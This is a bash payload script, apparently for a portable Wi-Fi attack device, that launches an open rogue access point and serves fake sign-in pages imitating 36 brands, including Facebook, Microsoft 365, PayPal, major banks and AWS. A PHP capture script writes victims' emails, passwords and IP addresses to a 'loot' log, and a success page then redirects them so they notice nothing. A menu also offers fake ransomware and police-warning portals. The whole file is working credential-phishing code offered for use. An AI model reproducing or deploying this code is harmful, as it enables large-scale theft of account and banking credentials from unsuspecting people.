#!/bin/bash
# Title: Portal Master
# Author: bad-antics
# Description: All-in-one portal launcher with 15+ templates
# Category: nullsec/social

LOOT_DIR="/mmc/nullsec/creds"
mkdir -p "$LOOT_DIR"

PROMPT "NULLSEC PORTAL MASTER

15+ captive portal
templates in one payload.

Choose your target
demographic and deploy!

by bad-antics

Press OK to configure."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

PROMPT "PORTAL CATEGORIES:

1. Social Media
2. Corporate/Business
3. ISP/Carrier
4. Entertainment
5. Financial
6. Technical/IT
7. NullSec Specials

Enter category next."

CATEGORY=$(NUMBER_PICKER "Category (1-7):" 1)

case $CATEGORY in
    1) # Social
        PROMPT "SOCIAL MEDIA:

1. Facebook
2. Instagram  
3. Twitter/X
4. LinkedIn
5. TikTok
6. Snapchat"
        TEMPLATE=$(NUMBER_PICKER "Template (1-6):" 1)
        case $TEMPLATE in
            1) PORTAL_NAME="Facebook"; DEFAULT_SSID="Facebook WiFi" ;;
            2) PORTAL_NAME="Instagram"; DEFAULT_SSID="Instagram_Guest" ;;
            3) PORTAL_NAME="Twitter"; DEFAULT_SSID="Twitter_WiFi" ;;
            4) PORTAL_NAME="LinkedIn"; DEFAULT_SSID="LinkedIn_Connect" ;;
            5) PORTAL_NAME="TikTok"; DEFAULT_SSID="TikTok_Zone" ;;
            6) PORTAL_NAME="Snapchat"; DEFAULT_SSID="Snapchat_Spot" ;;
        esac
        ;;
    2) # Corporate
        PROMPT "CORPORATE:

1. Microsoft 365
2. Google Workspace
3. Salesforce
4. Slack
5. Zoom
6. Cisco WebEx"
        TEMPLATE=$(NUMBER_PICKER "Template (1-6):" 1)
        case $TEMPLATE in
            1) PORTAL_NAME="Microsoft365"; DEFAULT_SSID="Corporate_Guest" ;;
            2) PORTAL_NAME="GoogleWorkspace"; DEFAULT_SSID="Google_Enterprise" ;;
            3) PORTAL_NAME="Salesforce"; DEFAULT_SSID="SF_Conference" ;;
            4) PORTAL_NAME="Slack"; DEFAULT_SSID="Slack_Connect" ;;
            5) PORTAL_NAME="Zoom"; DEFAULT_SSID="Zoom_Meeting" ;;
            6) PORTAL_NAME="Cisco"; DEFAULT_SSID="Cisco_Guest" ;;
        esac
        ;;
    3) # ISP
        PROMPT "ISP/CARRIER:

1. Xfinity/Comcast
2. AT&T
3. Verizon
4. T-Mobile
5. Spectrum
6. Cox"
        TEMPLATE=$(NUMBER_PICKER "Template (1-6):" 1)
        case $TEMPLATE in
            1) PORTAL_NAME="Xfinity"; DEFAULT_SSID="xfinitywifi" ;;
            2) PORTAL_NAME="ATT"; DEFAULT_SSID="attwifi" ;;
            3) PORTAL_NAME="Verizon"; DEFAULT_SSID="VZW_WiFi" ;;
            4) PORTAL_NAME="TMobile"; DEFAULT_SSID="T-Mobile_WiFi" ;;
            5) PORTAL_NAME="Spectrum"; DEFAULT_SSID="SpectrumWiFi" ;;
            6) PORTAL_NAME="Cox"; DEFAULT_SSID="CoxWiFi" ;;
        esac
        ;;
    4) # Entertainment
        PROMPT "ENTERTAINMENT:

1. Netflix
2. Spotify
3. Disney+
4. Amazon Prime
5. HBO Max
6. YouTube"
        TEMPLATE=$(NUMBER_PICKER "Template (1-6):" 1)
        case $TEMPLATE in
            1) PORTAL_NAME="Netflix"; DEFAULT_SSID="Netflix_Guest" ;;
            2) PORTAL_NAME="Spotify"; DEFAULT_SSID="Spotify_Lounge" ;;
            3) PORTAL_NAME="Disney"; DEFAULT_SSID="Disney_Guest" ;;
            4) PORTAL_NAME="Amazon"; DEFAULT_SSID="Amazon_WiFi" ;;
            5) PORTAL_NAME="HBO"; DEFAULT_SSID="HBO_Max_Zone" ;;
            6) PORTAL_NAME="YouTube"; DEFAULT_SSID="YouTube_Space" ;;
        esac
        ;;
    5) # Financial
        PROMPT "FINANCIAL:

1. PayPal
2. Bank of America
3. Chase
4. Wells Fargo
5. Venmo
6. Cash App"
        TEMPLATE=$(NUMBER_PICKER "Template (1-6):" 1)
        case $TEMPLATE in
            1) PORTAL_NAME="PayPal"; DEFAULT_SSID="PayPal_Secure" ;;
            2) PORTAL_NAME="BofA"; DEFAULT_SSID="BofA_Guest" ;;
            3) PORTAL_NAME="Chase"; DEFAULT_SSID="Chase_Connect" ;;
            4) PORTAL_NAME="WellsFargo"; DEFAULT_SSID="WF_Guest" ;;
            5) PORTAL_NAME="Venmo"; DEFAULT_SSID="Venmo_Zone" ;;
            6) PORTAL_NAME="CashApp"; DEFAULT_SSID="CashApp_WiFi" ;;
        esac
        ;;
    6) # Technical
        PROMPT "TECHNICAL:

1. Apple ID
2. Steam
3. GitHub
4. AWS
5. Azure
6. Cloudflare"
        TEMPLATE=$(NUMBER_PICKER "Template (1-6):" 1)
        case $TEMPLATE in
            1) PORTAL_NAME="Apple"; DEFAULT_SSID="Apple_Store" ;;
            2) PORTAL_NAME="Steam"; DEFAULT_SSID="Steam_Gaming" ;;
            3) PORTAL_NAME="GitHub"; DEFAULT_SSID="GitHub_HQ" ;;
            4) PORTAL_NAME="AWS"; DEFAULT_SSID="AWS_Guest" ;;
            5) PORTAL_NAME="Azure"; DEFAULT_SSID="Azure_Connect" ;;
            6) PORTAL_NAME="Cloudflare"; DEFAULT_SSID="CF_Guest" ;;
        esac
        ;;
    7) # NullSec
        PROMPT "NULLSEC SPECIALS:

1. Deface Portal
2. Ransomware Warning
3. Police Warning
4. Corporate Breach
5. System Update
6. Captive Survey"
        TEMPLATE=$(NUMBER_PICKER "Template (1-6):" 1)
        case $TEMPLATE in
            1) PORTAL_NAME="Deface"; DEFAULT_SSID="Free_WiFi" ;;
            2) PORTAL_NAME="Ransomware"; DEFAULT_SSID="Public_WiFi" ;;
            3) PORTAL_NAME="Police"; DEFAULT_SSID="Guest_Network" ;;
            4) PORTAL_NAME="Breach"; DEFAULT_SSID="Corporate_Guest" ;;
            5) PORTAL_NAME="Update"; DEFAULT_SSID="WiFi_Update" ;;
            6) PORTAL_NAME="Survey"; DEFAULT_SSID="Free_Internet" ;;
        esac
        ;;
esac

SSID=$(TEXT_PICKER "AP SSID:" "$DEFAULT_SSID")
DURATION=$(NUMBER_PICKER "Duration (min):" 30)
DURATION_SEC=$((DURATION * 60))
CRED_LOG="$LOOT_DIR/${PORTAL_NAME}_$(date +%Y%m%d_%H%M).txt"

resp=$(CONFIRMATION_DIALOG "DEPLOY PORTAL?

Template: $PORTAL_NAME
SSID: $SSID
Duration: ${DURATION} min

Press OK to launch.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

killall hostapd dnsmasq php 2>/dev/null

PORTAL_DIR="/tmp/portal_master"
mkdir -p "$PORTAL_DIR"

# Generate portal based on selection
# Using a generic template generator with brand colors
generate_portal() {
    local BRAND="$1"
    local COLOR="$2"
    local LOGO="$3"
    
cat > "$PORTAL_DIR/index.html" << PORTALHTML
<!DOCTYPE html>
<html>
<head>
<title>$BRAND - Sign In</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
.container{background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);width:100%;max-width:400px;}
.logo{text-align:center;margin-bottom:30px;}
.logo-icon{font-size:50px;color:$COLOR;}
.logo h1{color:$COLOR;font-size:28px;margin-top:10px;}
.subtitle{text-align:center;color:#666;margin-bottom:25px;font-size:14px;}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px;font-size:16px;transition:border 0.3s;}
input:focus{outline:none;border-color:$COLOR;}
button{width:100%;padding:14px;background:$COLOR;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;transition:opacity 0.3s;}
button:hover{opacity:0.9;}
.divider{text-align:center;margin:20px 0;color:#999;position:relative;}
.divider::before,.divider::after{content:'';position:absolute;top:50%;width:40%;height:1px;background:#ddd;}
.divider::before{left:0;}
.divider::after{right:0;}
.footer{text-align:center;margin-top:20px;font-size:12px;color:#999;}
.footer a{color:$COLOR;text-decoration:none;}
</style>
</head>
<body>
<div class="container">
<div class="logo">
<div class="logo-icon">$LOGO</div>
<h1>$BRAND</h1>
</div>
<p class="subtitle">Sign in to connect to WiFi</p>
<form method="POST" action="/capture.php">
<input type="text" name="email" placeholder="Email or Username" required>
<input type="password" name="password" placeholder="Password" required>
<input type="hidden" name="portal" value="$BRAND">
<button type="submit">Sign In</button>
</form>
<div class="divider">or</div>
<p class="footer">
By continuing, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
</p>
</div>
</body>
</html>
PORTALHTML
}

# Set brand colors and logos
case $PORTAL_NAME in
    "Facebook") generate_portal "Facebook" "#1877f2" "📘" ;;
    "Instagram") generate_portal "Instagram" "#E4405F" "📷" ;;
    "Twitter") generate_portal "X" "#000000" "𝕏" ;;
    "LinkedIn") generate_portal "LinkedIn" "#0A66C2" "💼" ;;
    "TikTok") generate_portal "TikTok" "#000000" "🎵" ;;
    "Snapchat") generate_portal "Snapchat" "#FFFC00" "👻" ;;
    "Microsoft365") generate_portal "Microsoft" "#0078D4" "⊞" ;;
    "GoogleWorkspace") generate_portal "Google" "#4285F4" "G" ;;
    "Salesforce") generate_portal "Salesforce" "#00A1E0" "☁️" ;;
    "Slack") generate_portal "Slack" "#4A154B" "#️⃣" ;;
    "Zoom") generate_portal "Zoom" "#2D8CFF" "📹" ;;
    "Cisco") generate_portal "Cisco" "#1BA0D7" "🌐" ;;
    "Xfinity") generate_portal "Xfinity" "#E4002B" "📡" ;;
    "ATT") generate_portal "AT&T" "#00A8E0" "📶" ;;
    "Verizon") generate_portal "Verizon" "#CD040B" "✓" ;;
    "TMobile") generate_portal "T-Mobile" "#E20074" "📱" ;;
    "Spectrum") generate_portal "Spectrum" "#0099D6" "📺" ;;
    "Cox") generate_portal "Cox" "#F36F21" "🏠" ;;
    "Netflix") generate_portal "Netflix" "#E50914" "🎬" ;;
    "Spotify") generate_portal "Spotify" "#1DB954" "🎵" ;;
    "Disney") generate_portal "Disney+" "#113CCF" "🏰" ;;
    "Amazon") generate_portal "Amazon" "#FF9900" "📦" ;;
    "HBO") generate_portal "HBO Max" "#5822B4" "🎭" ;;
    "YouTube") generate_portal "YouTube" "#FF0000" "▶️" ;;
    "PayPal") generate_portal "PayPal" "#003087" "💳" ;;
    "BofA") generate_portal "Bank of America" "#012169" "🏦" ;;
    "Chase") generate_portal "Chase" "#117ACA" "🏦" ;;
    "WellsFargo") generate_portal "Wells Fargo" "#D71E28" "🏦" ;;
    "Venmo") generate_portal "Venmo" "#3D95CE" "💸" ;;
    "CashApp") generate_portal "Cash App" "#00D632" "💵" ;;
    "Apple") generate_portal "Apple ID" "#000000" "🍎" ;;
    "Steam") generate_portal "Steam" "#171A21" "🎮" ;;
    "GitHub") generate_portal "GitHub" "#24292E" "🐙" ;;
    "AWS") generate_portal "AWS" "#FF9900" "☁️" ;;
    "Azure") generate_portal "Azure" "#0089D6" "☁️" ;;
    "Cloudflare") generate_portal "Cloudflare" "#F48120" "🔥" ;;
    *) generate_portal "WiFi Portal" "#333333" "📶" ;;
esac

# Capture script  
cat > "$PORTAL_DIR/capture.php" << CAPPHP
<?php
\$log = "$CRED_LOG";
\$ts = date("Y-m-d H:i:s");
\$ip = \$_SERVER['REMOTE_ADDR'];
\$email = \$_POST['email'] ?? '';
\$pass = \$_POST['password'] ?? '';
\$portal = \$_POST['portal'] ?? '';
file_put_contents(\$log, "[\$ts] PORTAL:\$portal IP:\$ip EMAIL:\$email PASS:\$pass\n", FILE_APPEND);
header("Location: /success.html");
?>
CAPPHP

cat > "$PORTAL_DIR/success.html" << 'SUCCESSHTML'
<!DOCTYPE html>
<html><head><title>Connected</title>
<style>body{font-family:sans-serif;text-align:center;padding:50px;background:#f5f5f5;}
.icon{font-size:60px;color:#4caf50;}h1{color:#333;}</style>
</head><body>
<div class="icon">✓</div>
<h1>Connected!</h1>
<p>Redirecting to internet...</p>
<script>setTimeout(function(){window.location='http://www.msftconnecttest.com/redirect';},2000);</script>
</body></html>
SUCCESSHTML

LOG "Starting Portal Master..."

cat > /tmp/pm_hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
auth_algs=1
wpa=0
EOF

hostapd /tmp/pm_hostapd.conf &
sleep 2
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up

cat > /tmp/pm_dns.conf << EOF
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.200,5m
address=/#/10.0.0.1
EOF
dnsmasq -C /tmp/pm_dns.conf &

cd "$PORTAL_DIR" && php -S 10.0.0.1:80 &

LOG "Portal active: $PORTAL_NAME"

sleep $DURATION_SEC

killall hostapd dnsmasq php 2>/dev/null

CRED_COUNT=$(wc -l < "$CRED_LOG" 2>/dev/null || echo 0)

PROMPT "PORTAL COMPLETE

Portal: $PORTAL_NAME
SSID: $SSID
Credentials: $CRED_COUNT

Log: $CRED_LOG
Press OK to exit."
